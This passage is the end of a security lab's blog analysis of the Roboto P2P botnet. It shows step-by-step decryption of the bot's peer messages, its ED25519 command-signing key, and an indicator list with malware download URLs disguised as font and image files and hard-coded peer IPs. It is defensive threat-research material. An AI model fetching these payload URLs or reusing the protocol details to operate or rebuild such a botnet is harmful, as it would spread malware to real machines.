		93 DA 64 B3 1F 49 1B A4 B5 2D 28 92 49 52 7C 3D 
		41 D2 4F B2 8B FF 2C ED A2 E7 90 18 4F 9E C0 7B
	32-63: Bot Curve25519_PublicKey
		52 25 27 87 F2 B2 F7 35 32 1F ED A7 6A 29 03 A8  
		3F A4 51 58 EF 53 F5 6F 28 99 01 8E 62 2C 4A 24

</code></pre>
<p>Peer reply, 60 bytes,</p>
<pre><code>index: 00 00 00 00
type: 00
data:
	cmdtype:
		4f 
	ip:port
		44 be 1c 18 da 42 
	PublibcKey:
		7e 42 89 b6 36 5f 73 10 88 ea 60 36 b9 ca 89 25 
		3e 3e e3 2f 7e b6 d6 08 9e 96 89 25 68 a0 9f 7f
	Hmac-sha256[0:0xf]	
		b5 1a d7 0d d4 63 83 0e de 06 34 ad 36 cc 83 4e

</code></pre>
<p>Analog decryption verification process</p>
<pre><code>1. Bot’s private key and Pee’s public key to generate shared key
SharedKey:
        28 EC 2D A8 63 F3 2D 39 8F 1C 03 96 32 AE F2 D8 
        B8 D1 9E 6C ED BD AC 2C BE D6 CF 60 83 C9 D6 1D
2. Using first 16 byte of HMAC-SHA256 for verification
	HMAC-SHA256[0:0XF]=
	b5 1a d7 0d d4 63 83 0e de 06 34 ad 36 cc 83 4e

3. Using last 16 bytes of the sharedkey, DWORD reverse，to be used as encryption key for TEA:
	A8 2D EC 28 39 2D F3 63 96 03 1C 8F D8 F2 AE 32
4. Using the above Key, to get XOR Key:
	First round: 4E 13 47 13 0A 2C C2 6A
	Second round: B0 68 BD EB 9B 29 10 23
	Third round: AD B4 3D 34 40 C0 3D FC
	Fourth round: 31 1E 6B F0 EA D5 8E 65
	Fivth round: D1 1C 42 58 2A 0C 7D A4
5. XOR dencryption，repeat step 4 on every 8 byte，to update XOR Key and get plaintext
    cmdtype:
        01
    ip:port:
        57 F9 0F 12 :F6 80 (87.249.15.18:63104)
    PublicKey:	
        14 F2 E1 0B DD C4 5A 00 AB 47 D4 0B 8D 8A 49 18 
        C2 0F FD 44 8E 5C 03 86 FB 47 95 67 30 8A 93 02
	
</code></pre>
<p>From the following network packets, we can see <code>87.249.15.18:63104</code> is exactly what we calculated.<br>
<a href="https://blog.netlab.360.com/content/images/2019/11/rob_secpeer.png"><img src="https://blog.netlab.360.com/content/images/2019/11/rob_secpeer.png" class="kg-image"></a></p>
<h6 id="attackcommandverification">Attack command verification</h6>
<p>In a P2P network, nodes are untrustworthy, and anyone can forge a P2P node at a very low cost. In order to ensure that the Roboto network is completely controllable and not stolen by others, Roboto needs to perform signature verification for each attack command. Only the attack messages that can be signed and signed can be accepted and executed by the Roboto node.<br>
The verification method adopted by Roboto is ED25519, which is a public digital signature algorithm. At the same time, the check public key is:<code>60FF4A4203433AA2333A008C1B305CD80846834B9BE4BBA274F873831F04DF1C</code>, the public key is integrated into each of the Roboto Bot samples.</p>
<h3 id="suggestions">Suggestions</h3>
<p>We recommend that Webmin users take a look whether they are infected by checking the process, file name and UDP network connection as we coverd above.</p>
<p>We recommend that Roboto Botnet related IP, URL and domain names to be monitored and blocked.</p>
<h3 id="contactus">Contact us</h3>
<p>Readers are always welcomed to reach us on <a href="https://twitter.com/360Netlab?ref=blog.netlab.360.com"><strong>twitter</strong></a>, WeChat 360Netlab or email to netlab at 360 dot cn.</p>
<h4 id="ioclist">IoC list</h4>
<p>Sample MD5</p>
<pre><code>4b98096736e94693e2dc5a1361e1a720
4cd7bcd0960a69500aa80f32762d72bc
d88c737b46f1dcb981b4bb06a3caf4d7
</code></pre>
<p>Encrypted Roboto Bot MD5</p>
<pre><code>image.jpg         de14c4345354720effd0710c099068e7
image2.jpg        69e1cccaa072aedc6a9fd9739e2cdf90
roboto.ttc        f47593cceec08751edbc0e9c56cad6ee
roboto.ttf        3020c2a8351c35530ab698e298a5735c
</code></pre>
<p>URL</p>
<pre><code>http://190.114.240.194/boot
http://citilink.dev6.ru/css/roboto.ttc
http://citilink.dev6.ru/css/roboto.ttf
http://144.76.139.83:80/community/uploadxx/1461C493-38BF-4E72-B118-BE35839A8914/image.jpg
http://144.76.139.83:80/community/uploadxx/1461C493-38BF-4E72-B118-BE35839A8914/image2.jpg
</code></pre>
<p>Hard-coded Peer IP</p>
<pre><code>95.216.17.209       	Finland             	ASN 24940           	Hetzner Online GmbH 
213.159.27.5        	Italy               	ASN 201474          	Aircom Service srl  
186.46.45.252       	Ecuador             	ASN 28006           	CORPORACION NACIONAL DE TELECOMUNICACIONES - CNT EP
120.150.43.45       	Australia           	ASN 1221            	Telstra Corporation Ltd
66.113.179.13       	United States       	ASN 14280           	NetNation Communications Inc
</code></pre>
<!--kg-card-end: markdown-->
      </section>



      <div id="disqus_thread" class="disqus-comments gh-canvas"></div>
      <script>
        var disqus_config = function () {
          this.page.url = "https://blog.netlab.360.com/the-awaiting-roboto-botnet-en/";
          this.page.identifier = "ghost-5dd49dcf7646030007b25c0e"
        };
        (function () {
          var d = document, s = d.createElement('script');
          s.src = 'https://blog-netlab-360.disqus.com/embed.js';
          s.setAttribute('data-timestamp', +new Date());
          (d.head || d.body).appendChild(s);
        })();
      </script>
    </article>

  </main>


    <aside class="read-more-wrap outer">
      <div class="inner">
        <div class="read-more-feed">
            <article class="read-more-card" 
                  style="background-image: url(/content/images/2019/02/astronomy-constellation-dark-998641-4.jpg)" 
              >
              <header class="read-more-card-header">
                <small class="read-more-card-header-sitetitle">&mdash; 360 Netlab Blog - Network Security Research Lab at 360 &mdash;</small>
                <h3 class="read-more-card-header-title"><a href="/tag/roboto/">Roboto</a></h3>
              </header>
              <div class="read-more-divider"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 14.5s2 3 5 3 5.5-2.463 5.5-5.5S21 6.5 18 6.5c-5 0-7 11-12 11C2.962 17.5.5 15.037.5 12S3 6.5 6 6.5s4.5 3.5 4.5 3.5"/></svg>
</div>
              <div class="read-more-card-content">
                <ul>
                  <li><a href="/the-awaiting-roboto-botnet/">潜伏者：Roboto Botnet 分析报告</a></li>
                </ul>
              </div>
              <footer class="read-more-card-footer">
                <a href="/tag/roboto/">1 post →</a>
              </footer>
            </article>

          
<article class="post-card post tag-dacls tag-rat tag-lazarus-group tag-cve-2019-3396 tag-honeypot tag-import-2022-11-30-11-16 no-image">


  <div class="post-card-content">

    <a class="post-card-content-link" href="/dacls-the-dual-platform-rat/">
      <header class="post-card-header">
        <div class="post-card-tags">
          <span class="post-card-primary-tag">Dacls</span>
        </div>
        <h2 class="post-card-title">
          Lazarus Group使用Dacls RAT攻击Linux平台
        </h2>
      </header>
      <div class="post-card-excerpt">背景介绍


2019年10月25号，360Netlab未知威胁检测系统发现一个可疑的ELF文件(80c0efb9e129f7f9b05a783df6959812)。一开始，我们以为这是在我们发现的Unknown Botnet中比较平凡的一个，并且在那时候VirusTotal上有2款杀毒引擎能够识别。当我们关联分析它的相关样本特征和IoC时，我们发现这个案例跟Lazarus Group有关，并决定深入分析它。


目前，业界也从未公开过关于Lazarus Group针对Linux平台的攻击样本和案例。通过详细的分析，我们确定这是一款功能完善，行为隐蔽并适用于Windows和Linux平台的RAT程序，并且其幕后攻击者疑似Lazarus Group。


事实上，这款远程控制软件相关样本早在2019年5月份就已经出现，目前在VirusTotal上显示被26款杀毒软件厂商识别为泛型的恶意软件，但它还是不为人所知，我们也没有找到相关分析报告。所以，我们会详细披露它的一些技术特征，并根据它的文件名和硬编码字符串特征将它命名为Dacls。



Dacls 概览


Dacls是一款新型的远程控</div>
    </a>

    <footer class="post-card-meta">
      <ul class="author-list">
        <li class="author-list-item">
          <div class="author-name-tooltip">
            jinye
          </div>

          <a href="/author/jinye/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2019/12/400--2-.jpeg" alt="jinye" />
          </a>
        </li>
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Genshen Ye
          </div>

          <a href="/author/yegenshen/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2017/10/1662072805.jpg" alt="Genshen Ye" />
          </a>
        </li>
      </ul>
      <time class="post-card-meta-date" datetime=" 2019-12-17">Dec 17, 2019</time>
      <span class="post-card-meta-length">16 min read</span>
    </footer>

  </div>

</article>
          
<article class="post-card post tag-p2p tag-botnet tag-webmin tag-cve-2019-15107 tag-roboto tag-honeypot tag-import-2022-11-30-11-16 no-image">


  <div class="post-card-content">

    <a class="post-card-content-link" href="/the-awaiting-roboto-botnet/">
      <header class="post-card-header">
        <div class="post-card-tags">
          <span class="post-card-primary-tag">P2P</span>
        </div>
        <h2 class="post-card-title">
          潜伏者：Roboto Botnet 分析报告
        </h2>
      </header>
      <div class="post-card-excerpt">背景介绍


2019年8月26号，360Netlab未知威胁检测系统发现一个可疑的ELF文件(4cd7bcd0960a69500aa80f32762d72bc)，目前在VirusTotal上显示仅有2款杀毒引擎检测识别。通过详细分析，我们确定这是一款基于P2P通信的Bot程序，并对它保持关注。


2019年10月11号，我们通过Anglerfish蜜罐捕获到另一个可疑的ELF样本(4b98096736e94693e2dc5a1361e1a720)，并且正是那个可疑的ELF样本的Downloader。这个Downloader样本会从2个硬编码的HTTP链接中下载Bot程序，其中一个下载地址把这个Bot样本伪装成Google的一个字体库“roboto.ttc”，所以我们将这个Botnet命名为Roboto。


我们已经持续关注了Roboto Botnet近3个月的时间，并在本文披露它的一些技术特征。



Roboto Botnet概览


目前，我们捕获到了Roboto Botnet的Downloader和Bot模块。根据它的传播方式和Bot样本特征，我们推测它还存在漏洞扫描模块和</div>
    </a>

    <footer class="post-card-meta">
      <ul class="author-list">
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Alex.Turing
          </div>

          <a href="/author/alex/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2019/06/turing.PNG" alt="Alex.Turing" />
          </a>
        </li>
        <li class="author-list-item">
          <div class="author-name-tooltip">
            Genshen Ye
          </div>

          <a href="/author/yegenshen/" class="static-avatar">
            <img class="author-profile-image" src="/content/images/2017/10/1662072805.jpg" alt="Genshen Ye" />
          </a>
        </li>
      </ul>
      <time class="post-card-meta-date" datetime=" 2019-11-20">Nov 20, 2019</time>
      <span class="post-card-meta-length">15 min read</span>
    </footer>

  </div>

</article>
        </div>
      </div>
    </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://blog.netlab.360.com">360 Netlab Blog - Network Security Research Lab at 360</a> &copy; 2025</section>
            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>


<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=2cbc1d8e23"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();

    // floating-header
    // Start fitVids
      var $postContent = $(".gh-content");
      $postContent.fitVids();
      // End fitVids

      var progressBar = document.querySelector('#reading-progress');
      var header = document.querySelector('.floating-header');
      var title = document.querySelector('.article-title');

      var lastScrollY = window.scrollY;
      var lastWindowHeight = window.innerHeight;
      var lastDocumentHeight = $(document).height();
      var ticking = false;

      function onScroll() {
        lastScrollY = window.scrollY;
        requestTick();
      }

      function onResize() {
        lastWindowHeight = window.innerHeight;
        lastDocumentHeight = $(document).height();
        requestTick();
      }

      function requestTick() {
        if (!ticking) {
          requestAnimationFrame(update);
        }
        ticking = true;
      }

      function update() {
        var trigger = title.getBoundingClientRect().top + window.scrollY;
        var triggerOffset = title.offsetHeight + 35;
        var progressMax = lastDocumentHeight - lastWindowHeight;

        // show/hide floating header
        if (lastScrollY >= trigger + triggerOffset) {
          header.classList.add('floating-active');
        } else {
          header.classList.remove('floating-active');
        }

        progressBar.setAttribute('max', progressMax);
        progressBar.setAttribute('value', lastScrollY);

        ticking = false;
      }

      window.addEventListener('scroll', onScroll, { passive: true });
      window.addEventListener('resize', onResize, false);

      update();
});
</script>



</body>
</html>
